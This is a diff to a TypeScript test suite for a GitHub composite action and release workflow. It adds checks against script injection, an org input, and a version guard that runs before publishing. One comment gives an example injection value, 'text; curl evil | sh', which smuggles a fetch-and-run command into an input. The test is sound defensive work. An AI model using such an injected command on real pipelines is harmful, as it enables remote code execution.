@@ -18,6 +18,7 @@ import { execSync } from 'node:child_process';
 import { resolve, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { load as yamlLoad } from 'js-yaml';
+import { commandExists } from './test-utils.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
@@ -123,6 +124,68 @@ describe('action.yml composite action', () => {
   it('steps reference codeql-action/upload-sarif', () => {
     const text = readFileSync(root('action.yml'), 'utf8');
     expect(text).toMatch(/codeql-action\/upload-sarif/);
+  });
+
+  it('does not interpolate the format input directly into the run script (no injection)', () => {
+    const text = readFileSync(root('action.yml'), 'utf8');
+    // GitHub substitutes ${{ inputs.format }} into the script TEXT before the
+    // shell runs, so a value like "text; curl evil | sh" would execute. The npx
+    // line must not carry the raw expression.
+    expect(text).not.toMatch(/npx vizzy-cli@latest[^\n]*\$\{\{\s*inputs\.format\s*\}\}/);
+  });
+
+  it('passes format via an env var and validates it against an allowlist', () => {
+    const text = readFileSync(root('action.yml'), 'utf8');
+    // Env values are not expanded as script text, so the input is safe there.
+    expect(text).toMatch(/FORMAT:\s*\$\{\{\s*inputs\.format\s*\}\}/);
+    // And it is checked against the closed set before use.
+    expect(text).toMatch(/(sarif|json|text)\|(sarif|json|text)\|(sarif|json|text)/);
+  });
+
+  it('defines an org input and forwards it as --org when set', () => {
+    // Without --org the action audits the TOKEN OWNER's personal repos; the
+    // default GITHUB_TOKEN (github-actions[bot]) owns none, so the audit silently
+    // no-ops with a green check. An org input lets it audit real repositories.
+    const text = readFileSync(root('action.yml'), 'utf8');
+    const doc = yamlLoad(text) as Record<string, unknown>;
+    const inputs = doc.inputs as Record<string, unknown>;
+    expect(inputs['org']).toBeDefined();
+    expect(text).toMatch(/ORG:\s*\$\{\{\s*inputs\.org\s*\}\}/);
+    expect(text).toMatch(/--org "\$ORG"/);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// .github/workflows/release.yml
+// ---------------------------------------------------------------------------
+
+describe('.github/workflows/release.yml', () => {
+  const relPath = (): string => root('.github', 'workflows', 'release.yml');
+
+  it('file exists and is valid YAML', () => {
+    expect(existsSync(relPath())).toBe(true);
+    expect(() => yamlLoad(readFileSync(relPath(), 'utf8'))).not.toThrow();
+  });
+
+  it('verifies the tag matches package.json version BEFORE publishing', () => {
+    const text = readFileSync(relPath(), 'utf8');
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const doc = yamlLoad(text) as any;
+    const steps = doc.jobs.release.steps as Array<Record<string, unknown>>;
+
+    const guardIdx = steps.findIndex(
+      (s) =>
+        typeof s.run === 'string' &&
+        /package\.json/.test(s.run) &&
+        /GITHUB_REF/.test(s.run),
+    );
+    const publishIdx = steps.findIndex(
+      (s) => typeof s.run === 'string' && /npm publish/.test(s.run),
+    );
+
+    expect(guardIdx).toBeGreaterThanOrEqual(0); // a tag/version guard exists
+    expect(publishIdx).toBeGreaterThanOrEqual(0);
+    expect(guardIdx).toBeLessThan(publishIdx); // and it runs before publish
   });
 });
 
@@ -303,7 +366,9 @@ describe('scripts/render-demo.sh', () => {
     expect(text).toMatch(/vhs.*demo\/vizzy\.tape|vhs.*vizzy\.tape/);
   });
 
-  it('passes shellcheck', () => {
+  // shellcheck is an optional dev tool: enforce it wherever it's installed (CI),
+  // skip it where it isn't (e.g. a Windows dev box) so the suite stays green.
+  it.skipIf(!commandExists('shellcheck'))('passes shellcheck', () => {
     const path = root('scripts', 'render-demo.sh');
     expect(() => {
       execSync(`shellcheck ${JSON.stringify(path)}`, { stdio: 'pipe' });
